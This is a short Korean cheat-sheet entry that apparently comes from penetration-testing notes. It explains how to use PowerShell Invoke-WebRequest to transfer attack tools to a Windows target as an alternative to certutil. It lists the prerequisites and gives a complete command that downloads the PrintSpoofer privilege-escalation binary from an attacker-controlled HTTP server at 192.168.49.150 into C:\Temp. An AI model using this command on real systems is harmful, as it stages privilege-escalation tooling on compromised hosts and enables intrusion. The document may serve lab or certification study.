- PowerShell Invoke-WebRequest(IWR)로 원격 URL의 파일을 타깃 로컬 경로에 내려받는 명령
- Windows 타깃에 도구 바이너리(PrintSpoofer.exe 등)를 전송할 때 certutil 대안으로 쓴다. 출력이 없어 성공을 별도 검증해야 한다
- 타깃에서 PowerShell 실행 가능, 공격자 HTTP 서버로의 아웃바운드 허용, 쓰기 가능한 경로(C:\Temp 등) 필요, 확인은 Get-Item으로

Invoke-WebRequest -Uri 'http://192.168.49.150/usr/share/windows-resources/binaries/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'
